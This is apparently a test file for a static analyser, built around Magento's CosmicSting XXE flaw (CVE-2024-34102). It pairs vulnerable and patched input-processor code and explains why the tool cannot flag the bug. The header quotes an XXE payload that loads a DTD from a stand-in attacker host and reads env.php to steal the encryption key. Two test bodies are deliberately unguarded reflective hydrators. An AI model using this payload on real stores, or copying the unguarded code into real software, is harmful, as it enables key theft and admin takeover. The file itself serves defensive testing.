@@ -1,0 +1,468 @@
+# Rank 1350 / CVE-2024-34102 ("CosmicSting", CVSS 9.8, CWE-611): Magento's REST
+# and SOAP entry point hydrates service-method arguments out of the request body
+# by reflection, and before 2.4.7-p1 it would hydrate *any* class reflection
+# named for it -- including a SimpleXMLElement subclass, whose constructor is an
+# XML parser.
+#
+# The chain is entirely inside two files. Magento\Webapi\Controller\Rest\
+# InputParamsResolver::getInputData() takes the decoded body --
+# `$inputData = $this->request->getRequestData();` -- and resolve() hands it to
+# Magento\Framework\Webapi\ServiceInputProcessor::process($serviceClass,
+# $serviceMethod, $inputData). process() walks the service method's declared
+# parameters and calls convertValue($paramValue, $type) for each; convertValue
+# routes anything non-scalar to _createFromArray($type, $data), which does:
+#
+#   $className = (string) $className;
+#   $class = new ClassReflection($className);
+#   $constructorArgs = $this->getConstructorData($className, $data);
+#   $object = $this->objectManager->create($className, $constructorArgs);
+#
+# and getConstructorData() reflects that class's __construct, then for every
+# constructor parameter *whose name appears as a key in the payload* recurses
+# back into convertValue($data[$parameter->getName()], $parameterType). So the
+# payload's own key names steer which types get hydrated next, one constructor
+# parameter at a time, and the values become that constructor's arguments.
+#
+# The attacker walks that recursion down to a constructor parameter typed as a
+# SimpleXMLElement subclass -- Magento\Framework\Simplexml\Element extends
+# \SimpleXMLElement, and \SimpleXMLElement::__construct($data, $options,
+# $dataIsURL) parses $data with the libxml flags in $options -- and supplies
+# both: `{"data": "<!DOCTYPE r [<!ENTITY % sp SYSTEM \"http://attacker/x.dtd\">
+# %sp;]><r/>", "options": 16}`. LIBXML_DTDVALID (16) turns DTD loading on, libxml
+# fetches the attacker's external DTD, and a parameter entity built over
+# `php://filter/convert.base64-encode/resource=app/etc/env.php` sends Magento's
+# `crypt/key` back out of band. With the encryption key the attacker signs an
+# admin integration token and reaches administrative endpoints, which is the
+# RCE half of the published exploit. No authentication is needed: guest-cart
+# endpoints such as POST /rest/V1/guest-carts/{id}/estimate-shipping-methods
+# reach process() with an attacker-shaped `address` object.
+#
+# The pool row's d10435b11ada4e502dca7539f8fd
+# 31d059d3c482 is "Magento Release 2.4.7-p1" by the packaging service: 268 files
+# and several unrelated patches (the InputParamsResolver key-collision filter,
+# QuoteAddressValidator, PathValidator). It is nevertheless the right row and
+# needs no correction, on two counts. Its diff does contain this fix, verbatim
+# and alone in lib/internal/Magento/Framework/Webapi/ServiceInputProcessor.php:
+#
+#   + if (is_subclass_of($className, \SimpleXMLElement::class)
+#   +     || is_subclass_of($className, \DOMElement::class)) {
+#   +     throw new SerializationException(new Phrase('Invalid data type'));
+#   + }
+#     $class = new ClassReflection($className);
+#
+# and its parent is the 2.4.7 release, i.e. the state that shipped vulnerable.
+# The same guard is developed in the open on 2.4-develop as the "AC-10815 - API
+# Input validation" series -- 2a0af7ad8bea first restricts the type
+# (`$class->isSubclassOf(\SimpleXMLElement::class) || ... \DOMNode::class`) while
+# dropping the earlier name-based mitigation that rejected a `sourcedata` key,
+# 91995dc5c65a turns the return into the SerializationException, dbea8e059f87
+# moves the check from getConstructorData() to _createFromArray() -- but no
+# single commit there carries the whole guard, and each parent carries
+# part of it, so none of them is a better `<fix>^`.
+#
+# ATTENTION, precision cost. Scanning the affected module at both revisions with
+# `timeout 180 ./bin/vyql scan --cache off --max-ram 6GB` -- the whole repository
+# is far past the bound, so the scan covers the sparse checkout of
+# lib/internal/Magento/Framework/{Webapi,Simplexml,Api} plus
+# app/code/Magento/Webapi, 302 PHP files including both files of the chain --
+# reports 40 findings at each revision, and the sets differ by exactly one
+# fingerprint: a VYQL-RF-043 (code.StateChangingOp, the attributeValueFactory
+# setter chain) that moves from ServiceInputProcessor.php:392 to :398 because the
+# guard is six lines long. Nothing is reported in _createFromArray,
+# getConstructorData, process, resolve or getInputData at either revision. The
+# six VYQL-DESER-015 findings in that scan are the unhardened
+# `simplexml_load_string($string, $this->_elementClass)` in
+# Simplexml/Config.php:147 and its unit tests -- Magento's config-file loader,
+# not this path. `vyql match` over the two files reports `== source == (none)`:
+# the request accessors are unlabelled, and so is the instantiation.
+#
+# Neither end of the chain is labelled, and the sink end is the one that cannot
+# be. There is no XML parser call anywhere in the vulnerable code: the parse
+# happens in a constructor that the DI container invokes, on a class named by a
+# runtime string that reflection produced (`$this->typeProcessor->getParamType(
+# $parameter)`), so no call site for it exists in any file and no resolution
+# strategy could recover one. This is the gadget-chain shape -- the dangerous
+# operation lives in a constructor selected at runtime -- not a construct the
+# engine mishandles, so there is nothing here to sweep as an engine gap.
+#
+# What is left is the absence-of-restriction signal, and Magento's own tree
+# measures it unshippable. The narrowest honest form is "a function that
+# reflects a runtime class name and then instantiates it with a caller-supplied
+# array, with no type restriction on what may be instantiated". In the 302 files
+# scanned it matches twice: ServiceInputProcessor::_createFromArray, the true
+# positive, and Api/ExtensionAttributesFactory::create, which does
+# `new \ReflectionClass($this->getExtensibleInterfaceName($extensibleClassName))`
+# and then `$this->objectManager->create($extensionFactoryName)` with a `$data`
+# array and no is_subclass_of anywhere -- one false positive for one true
+# positive, inside the module that contains the CVE. Widen it to
+# `$objectManager->create($variableClassName, ...)` alone and it matches 13 call
+# sites in those same 302 files, every other one a generated `*Factory` whose
+# entire body is that line (ValidatorFactory, FlagFactory, CurrencyFactory,
+# UrlFactory, Api/ObjectFactory, Api/Search/{SearchResult,Document,SearchCriteria}
+# Factory, Api/ExtensionAttribute/JoinDataInterfaceFactory);
+# Magento ships that class on the order of a thousand times, so the shape is the
+# framework's ordinary object construction and not a weakness at all. Narrowing
+# instead by naming getConstructorData, or `sourcedata`, or Magento's own
+# hydrator method names, is a repro-shaped patch that the next reflective
+# hydrator walks straight past. No definition change attempted.
+#
+# The four tests below pin that. The first two are the real chain either side of
+# the guard; the third and fourth are the same pair with the Magento vocabulary
+# removed, a reflective hydrator differing only in whether it restricts the type
+# it will instantiate; the fifth is the co-located ordinary factory that shares
+# the shape and must stay silent if the shape is ever labelled.
+#
+# verify_current_expected: attention-precision-cost, both revisions rejected.
+
+test "rank1350: the webapi input processor hydrates any reflected class from the request body, constructor arguments included"
+  lang php
+  file lib/internal/Magento/Framework/Webapi/ServiceInputProcessor.php
+  reject VYQL-DESER-001
+  reject VYQL-DESER-021
+  reject_review code.PolymorphicTypeSelectionReview
+  code
+  ```
+  <?php
+  namespace Magento\Framework\Webapi;
+
+  use Laminas\Code\Reflection\ClassReflection;
+
+  class InputParamsResolver
+  {
+      private $request;
+      private $router;
+      private $serviceInputProcessor;
+
+      public function resolve()
+      {
+          $route = $this->router->match($this->request);
+
+          return $this->serviceInputProcessor->process(
+              $route->getServiceClass(),
+              $route->getServiceMethod(),
+              $this->getInputData()
+          );
+      }
+
+      public function getInputData()
+      {
+          return $this->request->getRequestData();
+      }
+  }
+
+  class ServiceInputProcessor
+  {
+      private $config;
+      private $methodsMap;
+      private $objectManager;
+      private $typeProcessor;
+
+      public function process($serviceClassName, $serviceMethodName, array $inputArray)
+      {
+          $inputData = [];
+          foreach ($this->methodsMap->getMethodParams($serviceClassName, $serviceMethodName) as $param) {
+              $paramName = $param['name'];
+              if (isset($inputArray[$paramName])) {
+                  $inputData[] = $this->convertValue($inputArray[$paramName], $param['type']);
+              }
+          }
+
+          return $inputData;
+      }
+
+      public function convertValue($data, $type)
+      {
+          if ($this->typeProcessor->isTypeSimple($type) || $this->typeProcessor->isTypeAny($type)) {
+              return $this->typeProcessor->processSimpleAndAnyType($data, $type);
+          }
+
+          return $this->_createFromArray($type, $data);
+      }
+
+      private function getConstructorData(string $className, array $data): array
+      {
+          $preferenceClass = $this->config->getPreference($className);
+          $class = new ClassReflection($preferenceClass ?: $className);
+
+          try {
+              $constructor = $class->getMethod('__construct');
+          } catch (\ReflectionException $e) {
+              return [];
+          }
+
+          $res = [];
+          foreach ($constructor->getParameters() as $parameter) {
+              if (isset($data[$parameter->getName()])) {
+                  $parameterType = $this->typeProcessor->getParamType($parameter);
+                  $res[$parameter->getName()] = $this->convertValue($data[$parameter->getName()], $parameterType);
+              }
+          }
+
+          return $res;
+      }
+
+      protected function _createFromArray($className, $data)
+      {
+          $data = is_array($data) ? $data : [];
+          // convert to string directly to avoid situations when $className is object
+          // which implements __toString method like \ReflectionObject
+          $className = (string) $className;
+          $class = new ClassReflection($className);
+          $constructorArgs = $this->getConstructorData($className, $data);
+          $object = $this->objectManager->create($className, $constructorArgs);
+
+          return $object;
+      }
+  }
+  ```
+
+test "rank1350: the same input processor refusing to hydrate an XML document class"
+  lang php
+  file lib/internal/Magento/Framework/Webapi/ServiceInputProcessor.php
+  reject VYQL-DESER-001
+  reject VYQL-DESER-021
+  reject_review code.PolymorphicTypeSelectionReview
+  code
+  ```
+  <?php
+  namespace Magento\Framework\Webapi;
+
+  use Laminas\Code\Reflection\ClassReflection;
+  use Magento\Framework\Exception\SerializationException;
+  use Magento\Framework\Phrase;
+
+  class InputParamsResolver
+  {
+      private $request;
+      private $router;
+      private $serviceInputProcessor;
+
+      public function resolve()
+      {
+          $route = $this->router->match($this->request);
+
+          return $this->serviceInputProcessor->process(
+              $route->getServiceClass(),
+              $route->getServiceMethod(),
+              $this->getInputData()
+          );
+      }
+
+      public function getInputData()
+      {
+          return $this->request->getRequestData();
+      }
+  }
+
+  class ServiceInputProcessor
+  {
+      private $config;
+      private $methodsMap;
+      private $objectManager;
+      private $typeProcessor;
+
+      public function process($serviceClassName, $serviceMethodName, array $inputArray)
+      {
+          $inputData = [];
+          foreach ($this->methodsMap->getMethodParams($serviceClassName, $serviceMethodName) as $param) {
+              $paramName = $param['name'];
+              if (isset($inputArray[$paramName])) {
+                  $inputData[] = $this->convertValue($inputArray[$paramName], $param['type']);
+              }
+          }
+
+          return $inputData;
+      }
+
+      public function convertValue($data, $type)
+      {
+          if ($this->typeProcessor->isTypeSimple($type) || $this->typeProcessor->isTypeAny($type)) {
+              return $this->typeProcessor->processSimpleAndAnyType($data, $type);
+          }
+
+          return $this->_createFromArray($type, $data);
+      }
+
+      private function getConstructorData(string $className, array $data): array
+      {
+          $preferenceClass = $this->config->getPreference($className);
+          $class = new ClassReflection($preferenceClass ?: $className);
+
+          try {
+              $constructor = $class->getMethod('__construct');
+          } catch (\ReflectionException $e) {
+              return [];
+          }
+
+          $res = [];
+          foreach ($constructor->getParameters() as $parameter) {
+              if (isset($data[$parameter->getName()])) {
+                  $parameterType = $this->typeProcessor->getParamType($parameter);
+                  $res[$parameter->getName()] = $this->convertValue($data[$parameter->getName()], $parameterType);
+              }
+          }
+
+          return $res;
+      }
+
+      protected function _createFromArray($className, $data)
+      {
+          $data = is_array($data) ? $data : [];
+          // convert to string directly to avoid situations when $className is object
+          // which implements __toString method like \ReflectionObject
+          $className = (string) $className;
+          if (is_subclass_of($className, \SimpleXMLElement::class)
+              || is_subclass_of($className, \DOMElement::class)) {
+              throw new SerializationException(
+                  new Phrase('Invalid data type')
+              );
+          }
+          $class = new ClassReflection($className);
+          $constructorArgs = $this->getConstructorData($className, $data);
+          $object = $this->objectManager->create($className, $constructorArgs);
+
+          return $object;
+      }
+  }
+  ```
+
+test "rank1350: minimal pair -- a reflective hydrator that instantiates whatever class the payload steers it to"
+  lang php
+  file Acme/Rpc/Hydrator.php
+  reject VYQL-DESER-001
+  reject VYQL-DESER-021
+  reject_review code.PolymorphicTypeSelectionReview
+  code
+  ```
+  <?php
+  namespace Acme\Rpc;
+
+  class Hydrator
+  {
+      private $factory;
+
+      public function handle($method, array $payload)
+      {
+          $reflection = new \ReflectionMethod($this->serviceFor($method), 'run');
+          $args = [];
+          foreach ($reflection->getParameters() as $parameter) {
+              $name = $parameter->getName();
+              if (isset($payload[$name])) {
+                  $args[$name] = $this->hydrate($parameter->getType()->getName(), $payload[$name]);
+              }
+          }
+
+          return $args;
+      }
+
+      private function hydrate($className, $value)
+      {
+          if (!is_array($value)) {
+              return $value;
+          }
+          $className = (string) $className;
+          $class = new \ReflectionClass($className);
+          $ctorArgs = [];
+          $ctor = $class->getConstructor();
+          if ($ctor !== null) {
+              foreach ($ctor->getParameters() as $parameter) {
+                  $name = $parameter->getName();
+                  if (isset($value[$name])) {
+                      $ctorArgs[$name] = $this->hydrate($parameter->getType()->getName(), $value[$name]);
+                  }
+              }
+          }
+
+          return $this->factory->create($className, $ctorArgs);
+      }
+  }
+  ```
+
+test "rank1350: minimal pair -- the identical hydrator restricted to the types it is allowed to instantiate"
+  lang php
+  file Acme/Rpc/Hydrator.php
+  reject VYQL-DESER-001
+  reject VYQL-DESER-021
+  reject_review code.PolymorphicTypeSelectionReview
+  code
+  ```
+  <?php
+  namespace Acme\Rpc;
+
+  class Hydrator
+  {
+      private $factory;
+
+      public function handle($method, array $payload)
+      {
+          $reflection = new \ReflectionMethod($this->serviceFor($method), 'run');
+          $args = [];
+          foreach ($reflection->getParameters() as $parameter) {
+              $name = $parameter->getName();
+              if (isset($payload[$name])) {
+                  $args[$name] = $this->hydrate($parameter->getType()->getName(), $payload[$name]);
+              }
+          }
+
+          return $args;
+      }
+
+      private function hydrate($className, $value)
+      {
+          if (!is_array($value)) {
+              return $value;
+          }
+          $className = (string) $className;
+          if (!is_subclass_of($className, DataTransferObject::class)) {
+              throw new \InvalidArgumentException('Invalid data type');
+          }
+          $class = new \ReflectionClass($className);
+          $ctorArgs = [];
+          $ctor = $class->getConstructor();
+          if ($ctor !== null) {
+              foreach ($ctor->getParameters() as $parameter) {
+                  $name = $parameter->getName();
+                  if (isset($value[$name])) {
+                      $ctorArgs[$name] = $this->hydrate($parameter->getType()->getName(), $value[$name]);
+                  }
+              }
+          }
+
+          return $this->factory->create($className, $ctorArgs);
+      }
+  }
+  ```
+
+test "rank1350: an ordinary framework factory reflecting a derived class name and creating it is not a finding"
+  lang php
+  file lib/internal/Magento/Framework/Api/ExtensionAttributesFactory.php
+  reject VYQL-DESER-001
+  reject VYQL-DESER-021
+  reject_review code.PolymorphicTypeSelectionReview
+  code
+  ```
+  <?php
+  namespace Magento\Framework\Api;
+
+  class ExtensionAttributesFactory
+  {
+      private $objectManager;
+
+      public function create($extensibleClassName, $data = [])
+      {
+          $interfaceReflection = new \ReflectionClass($this->getExtensibleInterfaceName($extensibleClassName));
+
+          $methodReflection = $interfaceReflection->getMethod('getExtensionAttributes');
+          if ($methodReflection->getDeclaringClass()->getName() === self::EXTENSIBLE_INTERFACE_NAME) {
+              throw new \LogicException('Method getExtensionAttributes must be overridden.');
+          }
+
+          $interfaceName = '\\' . $interfaceReflection->getName();
+          $extensionClassName = substr($interfaceName, 0, -strlen('Interface')) . 'Extension';
+          $extensionFactoryName = $extensionClassName . 'Factory';
+          $extensionFactory = $this->objectManager->create($extensionFactoryName);
+
+          return $extensionFactory->create($data);
+      }
+  }
+  ```
